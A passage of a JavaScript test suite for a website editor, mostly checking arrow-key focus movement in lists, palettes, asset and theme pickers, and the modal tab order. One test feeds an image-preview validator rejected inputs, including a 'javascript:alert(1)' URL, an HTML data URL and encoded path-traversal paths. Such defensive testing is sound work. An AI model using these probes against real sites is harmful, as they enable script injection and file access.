        key: "ArrowDown",
        target: about,
        currentTarget: about,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      nav.onNavKeyDown(boundary);
      const nested = {
        key: "ArrowDown",
        target: doc.createElement("span"),
        currentTarget: home,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      nav.onNavKeyDown(nested);
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "NavList.tsx"),
        "utf8",
      );
      const keyboard = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "navKeyboard.ts"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      record(
        "navigation list moves with the arrow keys without opening a page",
        down === about &&
          up === home &&
          upEdge === null &&
          end === about &&
          toStart === home &&
          ignore === null &&
          move.defaultPrevented === true &&
          focused &&
          scrolled &&
          opens === 0 &&
          boundary.defaultPrevented === true &&
          nested.defaultPrevented === false &&
          source.split("onKeyDown={onNavKeyDown}").length - 1 === 1 &&
          !keyboard.includes(".click(") &&
          help.includes(
            "Move between navigation entries when the navigation list is focused",
          ),
        `down=${down === about} up=${up === home} edge=${upEdge === null} end=${end === about} focused=${focused} scroll=${panel.scrollTop} opens=${opens} boundary=${boundary.defaultPrevented} nested=${nested.defaultPrevented}`,
      );
      panel.remove();
    } catch (error) {
      record(
        "navigation list moves with the arrow keys without opening a page",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // The block palette put every block in the tab order. Arrow keys move
  // between the visible blocks and leave exactly one tab stop. They must
  // not insert a block.
  {
    try {
      const palette = compileRendererHelper("src/renderer/paletteKeyboard.ts");
      const doc = dom.window.document;
      const panel = doc.createElement("div");
      panel.className = "workspace-tab-panel";
      const list = doc.createElement("ul");
      list.id = "block-palette";
      const header = doc.createElement("li");
      header.className = "palette-category-header";
      header.textContent = "Structure";
      list.append(header);
      const make = (type) => {
        const item = doc.createElement("li");
        item.dataset.block = type;
        item.tabIndex = -1;
        item.textContent = type;
        list.append(item);
        return item;
      };
      const heading = make("heading");
      const quote = make('quo"te');
      const text = make("text");
      heading.tabIndex = 0;
      panel.append(list);
      doc.body.append(panel);
      const items = [heading, quote, text];
      const down = palette.paletteMoveTarget(items, heading, "ArrowDown");
      const up = palette.paletteMoveTarget(items, text, "ArrowUp");
      const upEdge = palette.paletteMoveTarget(items, heading, "ArrowUp");
      const end = palette.paletteMoveTarget(items, heading, "End");
      const toStart = palette.paletteMoveTarget(items, text, "Home");
      const ignore = palette.paletteMoveTarget(items, heading, "Enter");
      const firstStop = palette.paletteTabStop("heading", "heading");
      const laterStop = palette.paletteTabStop("text", "heading");
      const noneStop = palette.paletteTabStop("heading", null);
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      panel.getBoundingClientRect = () => rect(0, 100);
      quote.getBoundingClientRect = () => rect(20, 50);
      let inserts = 0;
      text.addEventListener("click", () => {
        inserts += 1;
      });
      const move = {
        key: "ArrowDown",
        target: heading,
        currentTarget: heading,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      palette.onPaletteKeyDown(move);
      const focused = doc.activeElement === quote;
      const oneStop =
        heading.tabIndex === -1 && quote.tabIndex === 0 && text.tabIndex === -1;
      const scrolled = panel.scrollTop === 0;
      quote.getBoundingClientRect = () => rect(40, 70);
      text.getBoundingClientRect = () => rect(300, 330);
      const moveEnd = {
        key: "End",
        target: quote,
        currentTarget: quote,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      palette.onPaletteKeyDown(moveEnd);
      const endFocused = doc.activeElement === text;
      const endStop = text.tabIndex === 0 && quote.tabIndex === -1;
      const endScrolled = panel.scrollTop === 292;
      const boundary = {
        key: "ArrowDown",
        target: text,
        currentTarget: text,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      palette.onPaletteKeyDown(boundary);
      const nested = {
        key: "ArrowDown",
        target: doc.createElement("span"),
        currentTarget: heading,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      palette.onPaletteKeyDown(nested);
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "Palette.tsx"),
        "utf8",
      );
      const keyboard = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "paletteKeyboard.ts"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      record(
        "block palette moves with the arrow keys without inserting a block",
        down === quote &&
          up === quote &&
          upEdge === null &&
          end === text &&
          toStart === heading &&
          ignore === null &&
          firstStop === 0 &&
          laterStop === -1 &&
          noneStop === -1 &&
          move.defaultPrevented === true &&
          focused &&
          oneStop &&
          scrolled &&
          moveEnd.defaultPrevented === true &&
          endFocused &&
          endStop &&
          endScrolled &&
          inserts === 0 &&
          boundary.defaultPrevented === true &&
          nested.defaultPrevented === false &&
          source.includes("paletteTabStop(item.type, stopType())") &&
          source.includes("onPaletteKeyDown(e)") &&
          !source.includes("tabIndex={0}") &&
          !keyboard.includes(".click(") &&
          help.includes(
            "Move between blocks in the block palette when that list is focused",
          ),
        `down=${down === quote} focused=${focused} oneStop=${oneStop} endFocused=${endFocused} endStop=${endStop} scroll=${panel.scrollTop} inserts=${inserts} boundary=${boundary.defaultPrevented} nested=${nested.defaultPrevented}`,
      );
      panel.remove();
    } catch (error) {
      record(
        "block palette moves with the arrow keys without inserting a block",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Saved sections sit under the block palette. Each row can insert and
  // delete, and every button was its own tab stop. Arrow keys move between
  // them and must not insert or delete a section.
  {
    try {
      const templates = compileRendererHelper(
        "src/renderer/templateKeyboard.ts",
      );
      const doc = dom.window.document;
      const panel = doc.createElement("div");
      panel.className = "workspace-tab-panel";
      const list = doc.createElement("ul");
      list.id = "template-palette";
      const makeRow = (id, deletable) => {
        const row = doc.createElement("li");
        const insert = doc.createElement("button");
        insert.type = "button";
        insert.className = "palette-insert-btn template-insert-btn";
        insert.dataset.templateId = id;
        insert.dataset.templateAction = "insert";
        insert.tabIndex = -1;
        insert.textContent = id;
        row.append(insert);
        let remove = null;
        if (deletable) {
          remove = doc.createElement("button");
          remove.type = "button";
          remove.className = "mini-btn template-delete-btn";
          remove.dataset.templateId = id;
          remove.dataset.templateAction = "delete";
          remove.tabIndex = -1;
          remove.textContent = "Delete";
          row.append(remove);
        }
        list.append(row);
        return { row, insert, remove };
      };
      const home = makeRow("home", false);
      const quote = makeRow('quo"te', true);
      const about = makeRow("about", true);
      home.insert.tabIndex = 0;
      panel.append(list);
      doc.body.append(panel);
      const rows = [home.row, quote.row, about.row];
      const down = templates.templateMoveTarget(rows, home.insert, "ArrowDown");
      const right = templates.templateMoveTarget(
        rows,
        quote.insert,
        "ArrowRight",
      );
      const downDelete = templates.templateMoveTarget(
        rows,
        quote.remove,
        "ArrowDown",
      );
      const left = templates.templateMoveTarget(
        rows,
        about.remove,
        "ArrowLeft",
      );
      const up = templates.templateMoveTarget(rows, about.insert, "ArrowUp");
      const toStart = templates.templateMoveTarget(rows, about.insert, "Home");
      const end = templates.templateMoveTarget(rows, home.insert, "End");
      const noDelete = templates.templateMoveTarget(
        rows,
        home.insert,
        "ArrowRight",
      );
      const ignore = templates.templateMoveTarget(rows, home.insert, "Enter");
      const kept = templates.templateStop(
        [{ id: "home" }, { id: "quote", deletable: true }],
        "quote",
        "delete",
      );
      const dropped = templates.templateStop(
        [{ id: "home" }, { id: "quote" }],
        "quote",
        "delete",
      );
      const missing = templates.templateStop(
        [{ id: "home" }],
        "gone",
        "insert",
      );
      const empty = templates.templateStop([], "home", "insert");
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      panel.getBoundingClientRect = () => rect(0, 100);
      quote.insert.getBoundingClientRect = () => rect(20, 50);
      let inserts = 0;
      let deletes = 0;
      quote.insert.addEventListener("click", () => {
        inserts += 1;
      });
      quote.remove.addEventListener("click", () => {
        deletes += 1;
      });
      const move = {
        key: "ArrowDown",
        target: home.insert,
        currentTarget: home.insert,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      templates.onTemplateKeyDown(move);
      const focused = doc.activeElement === quote.insert;
      const oneStop =
        home.insert.tabIndex === -1 &&
        quote.insert.tabIndex === 0 &&
        quote.remove.tabIndex === -1 &&
        about.insert.tabIndex === -1;
      const scrolled = panel.scrollTop === 0;
      about.insert.getBoundingClientRect = () => rect(300, 330);
      const moveEnd = {
        key: "End",
        target: quote.insert,
        currentTarget: quote.insert,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      templates.onTemplateKeyDown(moveEnd);
      const endFocused = doc.activeElement === about.insert;
      const endStop =
        about.insert.tabIndex === 0 && quote.insert.tabIndex === -1;
      const endScrolled = panel.scrollTop === 292;
      const boundary = {
        key: "ArrowDown",
        target: about.insert,
        currentTarget: about.insert,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      templates.onTemplateKeyDown(boundary);
      const nested = {
        key: "ArrowDown",
        target: doc.createElement("span"),
        currentTarget: home.insert,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      templates.onTemplateKeyDown(nested);
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "Templates.tsx"),
        "utf8",
      );
      const keyboard = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "templateKeyboard.ts"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      record(
        "saved sections move with the arrow keys without inserting or deleting",
        down === quote.insert &&
          right === quote.remove &&
          downDelete === about.remove &&
          left === about.insert &&
          up === quote.insert &&
          toStart === home.insert &&
          end === about.insert &&
          noDelete === null &&
          ignore === null &&
          kept &&
          kept.id === "quote" &&
          kept.kind === "delete" &&
          dropped &&
          dropped.id === "home" &&
          dropped.kind === "insert" &&
          missing &&
          missing.id === "home" &&
          missing.kind === "insert" &&
          empty === null &&
          move.defaultPrevented === true &&
          focused &&
          oneStop &&
          scrolled &&
          moveEnd.defaultPrevented === true &&
          endFocused &&
          endStop &&
          endScrolled &&
          inserts === 0 &&
          deletes === 0 &&
          boundary.defaultPrevented === true &&
          nested.defaultPrevented === false &&
          source.split("onKeyDown={rememberStop}").length - 1 === 2 &&
          source.includes("templateStop(") &&
          source.includes('data-template-action="insert"') &&
          source.includes('data-template-action="delete"') &&
          !keyboard.includes(".click(") &&
          help.includes(
            "Move between saved sections and their delete buttons when that list is focused",
          ),
        `down=${down === quote.insert} right=${right === quote.remove} deleteDown=${downDelete === about.remove} focused=${focused} oneStop=${oneStop} endFocused=${endFocused} scroll=${panel.scrollTop} inserts=${inserts} deletes=${deletes} boundary=${boundary.defaultPrevented} nested=${nested.defaultPrevented}`,
      );
      panel.remove();
    } catch (error) {
      record(
        "saved sections move with the arrow keys without inserting or deleting",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // A relative image address is valid on the published site. The inspector
  // used to assign it to an img, and img-src 'self' then loaded it from the
  // editor. Only a project file, returned as a data image, may be painted.
  {
    try {
      const preview = compileRendererHelper("src/shared/assetPreview.ts");
      const inspector = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "BlockProps", "shared.tsx"),
        "utf8",
      );
      const canvas = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorBlockRender.ts"),
        "utf8",
      );
      const engine = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "zephusEngine.ts"),
        "utf8",
      );
      const project = preview.isProjectAssetPath("/photos/hero.png");
      const relative = preview.isProjectAssetPath("photos/hero.png");
      const protocol = preview.isProjectAssetPath("//cdn.example/hero.png");
      const remote = preview.isProjectAssetPath("https://cdn.example/hero.png");
      const parent = preview.isProjectAssetPath("/photos/../secret.png");
      const encoded = preview.isProjectAssetPath("/photos/%2e%2e/secret.png");
      const query = preview.isProjectAssetPath("/photos/hero.png?x=1");
      const dataImage = preview.isAcceptedImageDataUrl(
        "data:image/png;base64,aaaa",
      );
      const dataSvg = preview.isAcceptedImageDataUrl(
        "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>",
      );
      const remoteData = preview.isAcceptedImageDataUrl(
        "https://cdn.example/hero.png",
      );
      const htmlData = preview.isAcceptedImageDataUrl(
        "data:text/html,<img src=x>",
      );
      const scriptData = preview.isAcceptedImageDataUrl("javascript:alert(1)");
      record(
        "inspector image preview does not fetch the editor",
        project === true &&
          relative === false &&
          protocol === false &&
          remote === false &&
          parent === false &&
          encoded === false &&
          query === false &&
          dataImage === true &&
          dataSvg === true &&
          remoteData === false &&
          htmlData === false &&
          scriptData === false &&
          inspector.includes("isProjectAssetPath(source)") &&
          inspector.includes("isAcceptedImageDataUrl(resolved)") &&
          inspector.includes("CANVAS_ASSET_PLACEHOLDER_SRC") &&
          !/\bsetPreviewSrc\(source\)/.test(inspector) &&
          !inspector.includes('setPreviewSrc("")') &&
          canvas.includes("isProjectAssetPath(src)") &&
          engine.includes("isAcceptedImageDataUrl(dataUrl)"),
        `project=${project} relative=${relative} protocol=${protocol} remote=${remote} parent=${parent} encoded=${encoded} query=${query} data=${dataImage}/${dataSvg} rejected=${remoteData}/${htmlData}/${scriptData}`,
      );
    } catch (error) {
      record(
        "inspector image preview does not fetch the editor",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Recent projects put every project and its Remove button in the tab
  // order. Remove is invisible until focused, so an arrow must move there
  // without opening or removing a project.
  {
    try {
      const recent = compileRendererHelper("src/renderer/recentKeyboard.ts");
      const doc = dom.window.document;
      const scroller = doc.createElement("main");
      scroller.className = "start-main";
      const list = doc.createElement("ul");
      list.id = "recent-list";
      const makeRow = (projectPath) => {
        const row = doc.createElement("li");
        const open = doc.createElement("button");
        open.type = "button";
        open.className = "recent-project";
        open.dataset.recentPath = projectPath;
        open.dataset.recentAction = "open";
        open.tabIndex = -1;
        open.textContent = projectPath;
        const remove = doc.createElement("button");
        remove.type = "button";
        remove.className = "recent-remove";
        remove.dataset.recentPath = projectPath;
        remove.dataset.recentAction = "remove";
        remove.tabIndex = -1;
        remove.textContent = "Remove";
        row.append(open, remove);
        list.append(row);
        return { row, open, remove };
      };
      const home = makeRow("C:\\sites\\home");
      const quote = makeRow('C:\\sites\\quo"te');
      const about = makeRow("C:\\sites\\about");
      home.open.tabIndex = 0;
      scroller.append(list);
      doc.body.append(scroller);
      const rows = [home.row, quote.row, about.row];
      const down = recent.recentMoveTarget(rows, home.open, "ArrowDown");
      const right = recent.recentMoveTarget(rows, quote.open, "ArrowRight");
      const downRemove = recent.recentMoveTarget(
        rows,
        quote.remove,
        "ArrowDown",
      );
      const left = recent.recentMoveTarget(rows, about.remove, "ArrowLeft");
      const up = recent.recentMoveTarget(rows, about.open, "ArrowUp");
      const toStart = recent.recentMoveTarget(rows, about.open, "Home");
      const end = recent.recentMoveTarget(rows, home.open, "End");
      const edge = recent.recentMoveTarget(rows, home.open, "ArrowLeft");
      const ignore = recent.recentMoveTarget(rows, home.open, "Enter");
      const kept = recent.recentStop(
        [{ path: "home" }, { path: "quote" }],
        "quote",
        "remove",
      );
      const missing = recent.recentStop([{ path: "home" }], "gone", "open");
      const empty = recent.recentStop([], "home", "open");
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      scroller.getBoundingClientRect = () => rect(0, 100);
      quote.open.getBoundingClientRect = () => rect(20, 50);
      let opens = 0;
      let removes = 0;
      quote.open.addEventListener("click", () => {
        opens += 1;
      });
      quote.remove.addEventListener("click", () => {
        removes += 1;
      });
      const move = {
        key: "ArrowDown",
        target: home.open,
        currentTarget: home.open,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      recent.onRecentKeyDown(move);
      const focused = doc.activeElement === quote.open;
      const oneStop =
        home.open.tabIndex === -1 &&
        quote.open.tabIndex === 0 &&
        quote.remove.tabIndex === -1 &&
        about.open.tabIndex === -1;
      const scrolled = scroller.scrollTop === 0;
      about.open.getBoundingClientRect = () => rect(300, 330);
      const moveEnd = {
        key: "End",
        target: quote.open,
        currentTarget: quote.open,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      recent.onRecentKeyDown(moveEnd);
      const endFocused = doc.activeElement === about.open;
      const endStop = about.open.tabIndex === 0 && quote.open.tabIndex === -1;
      const endScrolled = scroller.scrollTop === 292;
      const boundary = {
        key: "ArrowDown",
        target: about.open,
        currentTarget: about.open,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      recent.onRecentKeyDown(boundary);
      const nested = {
        key: "ArrowDown",
        target: doc.createElement("span"),
        currentTarget: home.open,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      recent.onRecentKeyDown(nested);
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "RecentProjects.tsx"),
        "utf8",
      );
      const keyboard = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "recentKeyboard.ts"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      record(
        "recent projects move with the arrow keys without opening or removing",
        down === quote.open &&
          right === quote.remove &&
          downRemove === about.remove &&
          left === about.open &&
          up === quote.open &&
          toStart === home.open &&
          end === about.open &&
          edge === null &&
          ignore === null &&
          kept &&
          kept.path === "quote" &&
          kept.kind === "remove" &&
          missing &&
          missing.path === "home" &&
          missing.kind === "open" &&
          empty === null &&
          move.defaultPrevented === true &&
          focused &&
          oneStop &&
          scrolled &&
          moveEnd.defaultPrevented === true &&
          endFocused &&
          endStop &&
          endScrolled &&
          opens === 0 &&
          removes === 0 &&
          boundary.defaultPrevented === true &&
          nested.defaultPrevented === false &&
          source.split("onKeyDown={rememberStop}").length - 1 === 2 &&
          source.includes("recentStop(") &&
          source.includes('data-recent-action="open"') &&
          source.includes('data-recent-action="remove"') &&
          !keyboard.includes(".click(") &&
          help.includes(
            "Move between recent projects and their remove buttons when that list is focused",
          ),
        `down=${down === quote.open} right=${right === quote.remove} focused=${focused} oneStop=${oneStop} endFocused=${endFocused} scroll=${scroller.scrollTop} opens=${opens} removes=${removes} boundary=${boundary.defaultPrevented} nested=${nested.defaultPrevented}`,
      );
      scroller.remove();
    } catch (error) {
      record(
        "recent projects move with the arrow keys without opening or removing",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // The modal trap treated every button as a tab stop, including controls
  // whose tabindex is -1. A roving list inside a modal would still be walked
  // one button at a time.
  {
    try {
      const focus = compileRendererHelper("src/renderer/modalFocus.ts");
      const doc = dom.window.document;
      const shown = (el) => {
        Object.defineProperty(el, "offsetParent", {
          configurable: true,
          get: () => doc.body,
        });
        return el;
      };
      const open = shown(doc.createElement("button"));
      open.type = "button";
      open.textContent = "Open";
      const hiddenStop = shown(doc.createElement("button"));
      hiddenStop.type = "button";
      hiddenStop.tabIndex = -1;
      hiddenStop.textContent = "Hidden";
      const disabled = shown(doc.createElement("button"));
      disabled.type = "button";
      disabled.disabled = true;
      const concealed = shown(doc.createElement("button"));
      concealed.type = "button";
      concealed.style.display = "none";
      const detached = doc.createElement("button");
      detached.type = "button";
      doc.body.append(open, hiddenStop, disabled, concealed);
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "modalController.ts"),
        "utf8",
      );
      record(
        "modal tab order skips controls that are not tab stops",
        focus.includeInModalTabOrder(open) === true &&
          focus.includeInModalTabOrder(hiddenStop) === false &&
          focus.includeInModalTabOrder(disabled) === false &&
          focus.includeInModalTabOrder(concealed) === false &&
          focus.includeInModalTabOrder(detached) === false &&
          source.includes("includeInModalTabOrder(el)"),
        `open=${focus.includeInModalTabOrder(open)} hidden=${focus.includeInModalTabOrder(hiddenStop)} disabled=${focus.includeInModalTabOrder(disabled)} concealed=${focus.includeInModalTabOrder(concealed)} detached=${focus.includeInModalTabOrder(detached)}`,
      );
      open.remove();
      hiddenStop.remove();
      disabled.remove();
      concealed.remove();
    } catch (error) {
      record(
        "modal tab order skips controls that are not tab stops",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // The asset browser put every file, Rename, and Delete in the tab order.
  // Arrow keys move between them and must not select, rename, or delete.
  // A preview address that is not a data image must not be requested.
  {
    try {
      const assets = compileRendererHelper("src/renderer/assetKeyboard.ts");
      const doc = dom.window.document;
      const grid = doc.createElement("div");
      grid.className = "asset-grid";
      const makeRow = (webPath, actions) => {
        const row = doc.createElement("div");
        row.className = "asset-tile-wrap";
        const select = doc.createElement("button");
        select.type = "button";
        select.className = "asset-tile";
        select.dataset.assetPath = webPath;
        select.dataset.assetAction = "select";
        select.tabIndex = -1;
        select.textContent = webPath;
        row.append(select);
        let rename = null;
        let remove = null;
        if (actions.rename) {
          rename = doc.createElement("button");
          rename.type = "button";
          rename.className = "mini-btn asset-rename-btn";
          rename.dataset.assetPath = webPath;
          rename.dataset.assetAction = "rename";
          rename.tabIndex = -1;
          row.append(rename);
        }
        if (actions.remove) {
          remove = doc.createElement("button");
          remove.type = "button";
          remove.className = "mini-btn danger asset-delete-btn";
          remove.dataset.assetPath = webPath;
          remove.dataset.assetAction = "delete";
          remove.tabIndex = -1;
          row.append(remove);
        }
        grid.append(row);
        return { row, select, rename, remove };
      };
      const home = makeRow("/photos/home.png", { rename: true, remove: true });
      const quote = makeRow('/photos/quo"te.png', {
        rename: false,
        remove: true,
      });
      const about = makeRow("/photos/about.png", {
        rename: true,
        remove: true,
      });
      home.select.tabIndex = 0;
      doc.body.append(grid);
      const rows = [home.row, quote.row, about.row];
      const down = assets.assetMoveTarget(rows, home.select, "ArrowDown");
      const right = assets.assetMoveTarget(rows, quote.select, "ArrowRight");
      const downDelete = assets.assetMoveTarget(
        rows,
        quote.remove,
        "ArrowDown",
      );
      const left = assets.assetMoveTarget(rows, about.remove, "ArrowLeft");
      const up = assets.assetMoveTarget(rows, about.select, "ArrowUp");
      const toStart = assets.assetMoveTarget(rows, about.select, "Home");
      const end = assets.assetMoveTarget(rows, home.select, "End");
      const edge = assets.assetMoveTarget(rows, home.select, "ArrowLeft");
      const ignore = assets.assetMoveTarget(rows, home.select, "Enter");
      const kept = assets.assetStop(
        [
          { webPath: "/photos/home.png", canRename: true, canDelete: true },
          { webPath: "/photos/about.png", canRename: true, canDelete: true },
        ],
        "/photos/about.png",
        "rename",
      );
      const dropped = assets.assetStop(
        [{ webPath: "/photos/home.png", canDelete: true }],
        "/photos/home.png",
        "rename",
      );
      const missing = assets.assetStop(
        [{ webPath: "/photos/home.png" }],
        "/gone.png",
        "select",
      );
      const empty = assets.assetStop([], "/photos/home.png", "select");
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      grid.getBoundingClientRect = () => rect(0, 100);
      quote.select.getBoundingClientRect = () => rect(20, 50);
      let selects = 0;
      let renames = 0;
      let deletes = 0;
      quote.select.addEventListener("click", () => {
        selects += 1;
      });
      quote.remove.addEventListener("click", () => {
        deletes += 1;
      });
      about.rename.addEventListener("click", () => {
        renames += 1;
      });
      const move = {
        key: "ArrowDown",
        target: home.select,
        currentTarget: home.select,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      assets.onAssetKeyDown(move);
      const focused = doc.activeElement === quote.select;
      const oneStop =
        home.select.tabIndex === -1 &&
        quote.select.tabIndex === 0 &&
        quote.remove.tabIndex === -1 &&
        about.select.tabIndex === -1;
      const scrolled = grid.scrollTop === 0;
      about.select.getBoundingClientRect = () => rect(300, 330);
      const moveEnd = {
        key: "End",
        target: quote.select,
        currentTarget: quote.select,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      assets.onAssetKeyDown(moveEnd);
      const endFocused = doc.activeElement === about.select;
      const endStop =
        about.select.tabIndex === 0 && quote.select.tabIndex === -1;
      const endScrolled = grid.scrollTop === 292;
      const boundary = {
        key: "ArrowDown",
        target: about.select,
        currentTarget: about.select,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      assets.onAssetKeyDown(boundary);
      const nested = {
        key: "ArrowDown",
        target: doc.createElement("span"),
        currentTarget: home.select,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      assets.onAssetKeyDown(nested);
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "AssetBrowserModal.tsx"),
        "utf8",
      );
      const keyboard = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "assetKeyboard.ts"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      record(
        "asset browser moves with the arrow keys without selecting or deleting",
        down === quote.select &&
          right === quote.remove &&
          downDelete === about.remove &&
          left === about.rename &&
          up === quote.select &&
          toStart === home.select &&
          end === about.select &&
          edge === null &&
          ignore === null &&
          kept &&
          kept.webPath === "/photos/about.png" &&
          kept.kind === "rename" &&
          dropped &&
          dropped.webPath === "/photos/home.png" &&
          dropped.kind === "select" &&
          missing &&
          missing.webPath === "/photos/home.png" &&
          missing.kind === "select" &&
          empty === null &&
          move.defaultPrevented === true &&
          focused &&
          oneStop &&
          scrolled &&
          moveEnd.defaultPrevented === true &&
          endFocused &&
          endStop &&
          endScrolled &&
          selects === 0 &&
          renames === 0 &&
          deletes === 0 &&
          boundary.defaultPrevented === true &&
          nested.defaultPrevented === false &&
          source.split("onKeyDown={rememberStop}").length - 1 === 3 &&
          source.includes("assetStop(") &&
          source.includes("isAcceptedImageDataUrl(asset.previewSrc)") &&
          source.includes('data-asset-action="select"') &&
          source.includes('data-asset-action="rename"') &&
          source.includes('data-asset-action="delete"') &&
          !source.includes("src={asset.previewSrc}") &&
          !keyboard.includes(".click(") &&
          help.includes(
            "Move between assets and their rename and delete buttons when that browser is focused",
          ),
        `down=${down === quote.select} right=${right === quote.remove} left=${left === about.rename} focused=${focused} oneStop=${oneStop} endFocused=${endFocused} scroll=${grid.scrollTop} selects=${selects} deletes=${deletes} boundary=${boundary.defaultPrevented} nested=${nested.defaultPrevented}`,
      );
      grid.remove();
    } catch (error) {
      record(
        "asset browser moves with the arrow keys without selecting or deleting",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Starter themes put Preview and Select on every card. Arrow keys move
  // between them and must not preview, select, or create a site.
  {
    try {
      const themes = compileRendererHelper("src/renderer/themeKeyboard.ts");
      const doc = dom.window.document;
      const scroller = doc.createElement("main");
      scroller.className = "start-main";
      const list = doc.createElement("div");
      list.id = "theme-list-container";
      const makeCard = (id, actions) => {
        const card = doc.createElement("article");
        card.className = "theme-card";
        let preview = null;
        let select = null;
        if (actions.preview) {
          preview = doc.createElement("button");
          preview.type = "button";
          preview.className = "mini-btn theme-preview-btn";
          preview.dataset.themeId = id;
          preview.dataset.themeAction = "preview";
          preview.tabIndex = -1;
          card.append(preview);
        }
        if (actions.select) {
          select = doc.createElement("button");
          select.type = "button";
          select.className = "mini-btn theme-select-btn";
          select.dataset.themeId = id;
          select.dataset.themeAction = "select";
          select.tabIndex = -1;
          card.append(select);
        }
        list.append(card);
        return { card, preview, select };
      };
      const home = makeCard("home", { preview: true, select: true });
      const quote = makeCard('quo"te', { preview: false, select: true });
      const about = makeCard("about", { preview: true, select: true });
      home.preview.tabIndex = 0;
      scroller.append(list);
      doc.body.append(scroller);
      const rows = [home.card, quote.card, about.card];
      const down = themes.themeMoveTarget(rows, home.preview, "ArrowDown");
      const right = themes.themeMoveTarget(rows, home.preview, "ArrowRight");
      const downSelect = themes.themeMoveTarget(rows, home.select, "ArrowDown");
      const left = themes.themeMoveTarget(rows, about.select, "ArrowLeft");
      const up = themes.themeMoveTarget(rows, about.select, "ArrowUp");
      const toStart = themes.themeMoveTarget(rows, about.preview, "Home");
      const end = themes.themeMoveTarget(rows, home.preview, "End");
      const edge = themes.themeMoveTarget(rows, home.preview, "ArrowLeft");
      const ignore = themes.themeMoveTarget(rows, home.preview, "Enter");
      const kept = themes.themeStop(
        [{ id: "home" }, { id: "about" }],
        "about",
        "select",
      );
      const missing = themes.themeStop([{ id: "home" }], "gone", "select");
      const empty = themes.themeStop([], "home", "preview");
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      scroller.getBoundingClientRect = () => rect(0, 100);
      about.preview.getBoundingClientRect = () => rect(20, 50);
      let previews = 0;
      let selects = 0;
      home.preview.addEventListener("click", () => {
        previews += 1;
      });
      about.select.addEventListener("click", () => {
        selects += 1;
      });
      const move = {
        key: "ArrowDown",
        target: home.preview,
        currentTarget: home.preview,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      themes.onThemeKeyDown(move);
      const focused = doc.activeElement === about.preview;
      const oneStop =
        home.preview.tabIndex === -1 &&
        home.select.tabIndex === -1 &&
        about.preview.tabIndex === 0 &&
        about.select.tabIndex === -1;
